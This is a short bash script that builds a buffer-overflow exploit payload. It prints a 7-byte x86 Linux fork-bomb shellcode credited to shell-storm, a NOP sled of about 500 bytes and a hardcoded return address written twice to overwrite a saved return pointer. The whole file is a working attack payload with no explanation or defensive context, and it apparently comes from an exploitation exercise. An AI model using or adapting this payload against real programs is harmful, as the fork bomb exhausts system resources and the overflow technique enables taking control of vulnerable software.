#!/bin/bash

#http://shell-storm.org/shellcode/files/shellcode-214.php
#7bytes
#fork bomb

echo -ne "\x6a\x02\x58\xcd\x80\xeb\xf9"
for i in $(seq 8 508)
do
   echo -ne "\x90"
done

for i in 1 2
do
    echo -ne "\x1c\xd4\xff\xff"
done